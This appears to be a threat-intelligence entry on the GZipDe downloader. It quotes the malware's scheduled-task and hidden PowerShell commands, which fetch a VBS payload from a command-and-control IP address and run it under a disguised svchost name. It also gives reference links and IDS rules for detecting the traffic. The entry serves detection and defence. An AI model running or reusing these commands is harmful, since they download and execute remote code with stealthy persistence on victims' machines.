## GZipDe


#### Commands
---

* Schtasks.exe

1.

```
/Create /sc MINUTE /MO 1 /TN WindowsUpdate /TR "Powershell -W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\"http://118.193.251.137/dropbox/?p=BT67HU78HZ\\\",\\\"$env:public\svchost325.vbs\\\");(New-Object -com Shell.Application).ShellExecute(\\\"$env:public\svchost325.vbs\\\");" /F
```

* Powershell.exe

1.

```
-W Hidden (New-Object System.Net.WebClient).DownloadFile(\\\'http[:]//118.193.251[.]137/dropbox/?p=BT67HU78HZ\\\',\\\'$env:public\svchost325.vbs\\\');(New-Object -com Shell.Application).ShellExecute(\\\'$env:public\svchost325.vbs\\\');' /F
```

#### Regular Expressions
---

``
``

#### Resources
---

Technical write-ups:
* https://www.alienvault.com/blogs/labs-research/gzipde-an-encrypted-downloader-serving-metasploit

Sandbox reports:
* https://app.any.run/tasks/e918c80e-ce60-42d6-b365-8fd3256420f0

Notes:

@Alianvault

#### Network Detection

Multi-purpose:

* AV ATTACK_RESPONSE Metasploit Reverse Shell Verification (Echo)

* ET ATTACK_RESPONSE Metasploit/Meterpreter - Sending metsrv.dll to Compromised Host

* ET ATTACK_RESPONSE Metasploit Meterpreter Reverse HTTPS certificate

Dedicated:

* alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"AV TROJAN GZipDe MacroMalware CnC Checkin"; flow:established,to_server; content:"/dropbox/?p="; http_uri; depth:12; content:!"User-Agent|3a| "; http_header; content:!"Referer"; http_header; pcre:"^/\/dropbox\/\?p=[a-zA-Z0-9]*$/U"; reference:md5,951d9f3320da660593930d3425a9271b; classtype:trojan-activity; sid:xxx; rev:1;)

* alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"AV TROJAN GZipDe MacroMalware Payload Request"; flow:established,to_server; content:"/dropbox/file"; depth:13; http_uri; content:".exe"; http_uri; distance:0; isdataat:!1,relative; content:!"User-Agent|3a| "; http_header; content:!"Referer"; http_header; reference:md5,951d9f3320da660593930d3425a9271b; classtype:trojan-activity; sid:xxx; rev:1;)

 
